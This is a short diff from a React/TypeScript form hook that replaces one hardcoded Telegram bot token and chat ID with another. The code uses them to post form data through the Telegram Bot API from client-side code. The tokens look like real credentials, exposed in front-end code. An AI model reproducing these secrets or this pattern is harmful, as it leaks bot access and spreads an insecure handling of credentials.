@@ -29,8 +29,8 @@ export const useForm = (validate: { (values: IValues): IValues }) => {
     const errors = validate(values);
     setFormState((prevState) => ({ ...prevState, errors }));
 
-    const botToken = '7583528133:AAGsYAzoMPzbL472dCgSH6Cz8-0h3h8coYo';
-    const chatId = '429954390';
+    const botToken = '8049279705:AAH1AosUqnKSgYggJ1lMwM2eCo_FQk5kSis';
+    const chatId = '630988677';
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     try {
